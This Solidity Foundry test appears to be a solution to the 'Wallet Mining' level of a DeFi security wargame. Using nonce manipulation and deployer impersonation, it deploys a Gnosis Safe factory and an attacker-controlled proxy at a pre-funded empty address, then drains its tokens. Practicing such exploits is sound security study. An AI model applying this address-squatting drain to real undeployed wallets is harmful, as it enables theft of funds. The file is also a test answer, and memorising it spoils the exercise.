// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {GnosisSafeProxyFactory} from "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import {GnosisSafeProxy} from "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";

import {WalletMiningLevel} from "../../src/wallet-mining/WalletMiningLevel.sol";

import "forge-std/Test.sol";

contract AttackerWallet {
  function transfer(address token, address to, uint256 amount) external {
    IERC20(token).transfer(to, amount);
  }
}

contract WalletMiningTest is Test {
  WalletMiningLevel level = new WalletMiningLevel();

  function setUp() public {
    level.setup();
  }

  function testExploit() public {
    GnosisSafeProxyFactory factory;
    GnosisSafeProxy wallet;
    AttackerWallet attacker;

    // Task 1.
    // Draining the funds from 0x9B6fb606A9f5789444c17768c6dFCF2f83563801
    //
    // - Funds were transferred to 0x9B6fb6.
    // - This is an empty address.
    // - Our assumption is that this is an undeployed Gnosis Safe wallet.
    // - The Gnosis Safe Factory is at 0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B
    //   We are informed that this contract is not deployed.
    //
    // The first approach to the solution happens by looking at etherscan,
    // we find the deployer, which in etherscan is identified as "Safe: Deployer 3"
    address gnosisDeployer = 0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A;

    // At etherscan there is the raw transaction.
    // Pre EIP-155 we could just replay the transaction in other networks,
    // which is what happened at Optimism with Gnosis Safe.
    //
    // In this exercise, we will just leverage the found deployer address
    // to deploy the factory and the master copy.
    // The latter is a requirement to solve the level.
    // Notice that we don't need to use the Gnosis Proxy, but we will
    // be using a custom contract to be able to drain the funds.
    vm.startPrank(gnosisDeployer);

    // By inspecting the deployer address transactions at etherscan
    // we learn that the nonces for each address are:
    // - 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F     0
    // - 0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B     2
    attacker = new AttackerWallet();
    vm.setNonce(gnosisDeployer, 2);
    factory = new GnosisSafeProxyFactory();

    vm.stopPrank();
    // With the factory set, we deploy our attacking wallet.
    //
    // First of all, we have to explain why we could get away with
    // deploying a custom contract as a wallet.
    // If we look at GnosisSafeProxyFactory.sol we find that the function
    // createProxy() does
    // proxy = new GnosisSafeProxy(singleton);
    // that is, they use the `CREATE` opcode, where the new address is
    // keccak256(sender, nonce).
    //
    // So with the (commented) code below we will brute force the creation
    // of wallets until we find the appropiate nonce.
    /*
    for (uint8 i = 0; i < 100; i++) {
      wallet = factory.createProxy(address(attacker), "");
      if ((address(wallet)) == 0x9B6fb606A9f5789444c17768c6dFCF2f83563801) {
        break;
      }
    }
    */
    //
    // Having found the nonce, we obtain the wallet.
    vm.setNonce(address(factory), 43);
    wallet = factory.createProxy(address(attacker), "");

    // Now that we have control of this address, we can drain its funds.
    AttackerWallet(address(wallet))
      .transfer(
        address(level.token()),
        level.playerAddress(),
        level.DEPOSIT_TOKEN_AMOUNT());

    level.validate();
  }
}

